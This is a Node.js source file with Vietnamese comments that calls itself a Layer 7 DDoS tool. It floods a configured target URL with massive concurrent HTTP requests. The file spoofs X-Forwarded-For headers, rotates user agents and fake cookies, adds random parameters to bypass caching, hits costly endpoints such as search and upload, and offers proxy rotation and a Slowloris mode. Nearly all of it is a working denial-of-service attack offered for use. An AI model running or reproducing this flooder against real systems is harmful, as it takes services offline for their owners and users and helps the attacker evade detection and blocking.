// server.js - DDoS Layer 7 siêu mạnh cho Node.js
// Chạy: npm install axios https-proxy-agent user-agents
// Sau đó: node server.js

const http = require('http');
const https = require('https');
const { Worker } = require('worker_threads');
const os = require('os');
const fs = require('fs');

// ===== CẤU HÌNH =====
const CONFIG = {
    target: 'http://192.168.1.100:8080',     // URL mục tiêu
    threads: os.cpus().length * 100,          // Số luồng (tự động theo CPU)
    requestsPerThread: 50000,                 // Số request mỗi luồng
    method: 'GET',                            // GET, POST, HEAD, PUT, DELETE
    timeout: 1000,                            // Timeout mỗi request (ms)
    useProxy: false,                          // Bật/tắt proxy rotation
    proxyList: 'proxies.txt',                 // File chứa danh sách proxy
    attackEndpoints: [                        // Các endpoint tấn công
        '/',
        '/api/search?q=' + 'a'.repeat(1000),
        '/api/login',
        '/api/upload',
        '/api/report'
    ],
    useRandomEndpoint: true,                  // Random endpoint mỗi request
    userAgentPool: [                          // User-Agent đa dạng
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0 Safari/537.36'
    ],
    cookies: [                                // Cookie giả để tốn resource
        'session=' + Math.random().toString(36).substring(2, 15),
        'token=' + Math.random().toString(36).substring(2, 20),
        'user=' + Math.random().toString(36).substring(2, 10)
    ],
    attackDuration: 0,                        // 0 = không giới hạn, số giây = tự dừng
    slowloris: false,                         // Bật Slowloris (giữ kết nối lâu)
    slowlorisDelay: 10000,                    // Giữ kết nối bao lâu (ms)
    verbose: true                             // Hiển thị log chi tiết
};

// ===== HÀM TẠO REQUEST =====
function createRequest(endpoint, method, ua, cookie, proxy = null) {
    const url = CONFIG.target + endpoint;
    const options = {
        method: method,
        headers: {
            'User-Agent': ua,
            'Cookie': cookie,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': CONFIG.slowloris ? 'keep-alive' : 'close',
            'X-Forwarded-For': Math.floor(Math.random() * 255) + '.' + 
                               Math.floor(Math.random() * 255) + '.' + 
                               Math.floor(Math.random() * 255) + '.' + 
                               Math.floor(Math.random() * 255)
        },
        timeout: CONFIG.timeout
    };

    // Thêm proxy nếu có
    if (proxy && CONFIG.useProxy) {
        const proxyUrl = new URL(proxy);
        options.agent = new https.Agent({
            proxy: {
                host: proxyUrl.hostname,
                port: proxyUrl.port,
                protocol: proxyUrl.protocol
            }
        });
    }

    // Thêm body cho POST
    if (method === 'POST') {
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.body = 'data=' + Math.random().toString(36).substring(2, 15) + 
                       '&t=' + Date.now() + 
                       '&x=' + 'a'.repeat(Math.floor(Math.random() * 5000));
    }

    // Thêm body cho PUT
    if (method === 'PUT') {
        options.headers['Content-Type'] = 'application/json';
        options.body = JSON.stringify({
            id: Math.random().toString(36).substring(2, 10),
            data: 'x'.repeat(Math.floor(Math.random() * 10000))
        });
    }

    return options;
}

// ===== HÀM GỬI REQUEST =====
function sendRequest(endpoint, method, ua, cookie, proxy = null) {
    return new Promise((resolve) => {
        const options = createRequest(endpoint, method, ua, cookie, proxy);
        const client = CONFIG.target.startsWith('https') ? https : http;
        const req = client.request(CONFIG.target + endpoint, options, (res) => {
            res.resume(); // Đọc response để giải phóng memory
            if (CONFIG.slowloris) {
                // Slowloris: Giữ kết nối lâu
                setTimeout(() => {
                    res.destroy();
                    resolve();
                }, CONFIG.slowlorisDelay);
            } else {
                resolve();
            }
        });

        req.on('error', () => resolve());
        req.on('timeout', () => { req.destroy(); resolve(); });

        // Gửi body nếu có
        if (options.body) {
            req.write(options.body);
        }
        req.end();
    });
}

// ===== LOAD PROXY =====
function loadProxies() {
    try {
        const data = fs.readFileSync(CONFIG.proxyList, 'utf8');
        return data.split('\n').filter(line => line.trim());
    } catch (e) {
        console.log('⚠️ Không tìm thấy file proxy, bỏ qua proxy');
        return [];
    }
}

// ===== HÀM TẤN CÔNG =====
async function startAttack(threadId) {
    let count = 0;
    let totalForThread = 0;
    const proxies = loadProxies();

    while (totalForThread < CONFIG.requestsPerThread) {
        // Random endpoint
        let endpoint = CONFIG.attackEndpoints[0];
        if (CONFIG.useRandomEndpoint) {
            endpoint = CONFIG.attackEndpoints[Math.floor(Math.random() * CONFIG.attackEndpoints.length)];
            // Thêm query param random để bypass cache
            endpoint += (endpoint.includes('?') ? '&' : '?') + 'r=' + Math.random().toString(36).substring(2, 8);
        }

        const ua = CONFIG.userAgentPool[Math.floor(Math.random() * CONFIG.userAgentPool.length)];
        const cookie = CONFIG.cookies[Math.floor(Math.random() * CONFIG.cookies.length)];
        const proxy = CONFIG.useProxy && proxies.length > 0 
            ? proxies[Math.floor(Math.random() * proxies.length)] 
            : null;

        await sendRequest(endpoint, CONFIG.method, ua, cookie, proxy);
        totalForThread++;
        count++;

        // Log tiến trình mỗi 1000 request
        if (count % 1000 === 0 && CONFIG.verbose) {
            console.log(`🧵 Thread ${threadId}: Sent ${totalForThread} requests`);
        }

        // Kiểm tra thời gian nếu có giới hạn
        if (CONFIG.attackDuration > 0 && Date.now() - startTime > CONFIG.attackDuration * 1000) {
            break;
        }
    }

    return totalForThread;
}

// ===== CHẠY TẤN CÔNG =====
console.log('🔥 DDoS Pro - Node.js Edition');
console.log('📌 Target:', CONFIG.target);
console.log('🧵 Threads:', CONFIG.threads);
console.log('📤 Requests/thread:', CONFIG.requestsPerThread);
console.log('📊 Total requests:', CONFIG.threads * CONFIG.requestsPerThread);
console.log('📡 Endpoints:', CONFIG.attackEndpoints.length);
console.log('🔄 Proxy:', CONFIG.useProxy ? 'ON' : 'OFF');
console.log('🐌 Slowloris:', CONFIG.slowloris ? 'ON' : 'OFF');
console.log('---------------------------');

const startTime = Date.now();
let totalSent = 0;
let completedThreads = 0;

// Khởi chạy các luồng
for (let i = 0; i < CONFIG.threads; i++) {
    setTimeout(async () => {
        const sent = await startAttack(i);
        totalSent += sent;
        completedThreads++;

        if (completedThreads === CONFIG.threads) {
            const endTime = Date.now();
            const duration = ((endTime - startTime) / 1000).toFixed(2);
            console.log('---------------------------');
            console.log('✅ DONE!');
            console.log('📊 Total requests:', totalSent);
            console.log('⏱️ Duration:', duration + 's');
            console.log('⚡ RPS:', Math.round(totalSent / duration));
            console.log('📈 Avg/thread:', Math.round(totalSent / CONFIG.threads));
            process.exit(0);
        }
    }, i * 2);
}

// Bắt lỗi và thoát an toàn
process.on('SIGINT', () => {
    console.log('\n⏹️ Stopped by user. Total:', totalSent);
    process.exit(0);
});

// Theo dõi memory
setInterval(() => {
    const memory = process.memoryUsage();
    console.log(`💾 Memory: ${Math.round(memory.rss / 1024 / 1024)}MB`);
}, 5000);
